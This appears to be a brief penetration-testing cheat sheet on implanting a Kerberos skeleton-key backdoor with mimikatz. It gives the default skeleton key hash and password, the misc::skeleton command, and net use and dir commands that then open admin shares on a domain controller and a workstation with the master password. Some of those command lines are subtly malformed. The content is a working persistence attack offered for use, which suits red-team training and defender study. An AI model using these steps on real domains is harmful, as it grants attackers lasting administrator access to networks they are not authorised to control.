# kerberos backdoor

### using mimikatz

* Works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps.
* A skeleton key only works using Kerberos RC4 encryption.
* The default hash skeleton key is `60BA4FCADC466C7A033C178194C03DF6` (password:`mimikatz`)

```bash
misc::skeleton

# done, now accessing admin share
> net use C:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
> dir \\Desktop-1\c$ /user:Machine1 mimikatz
```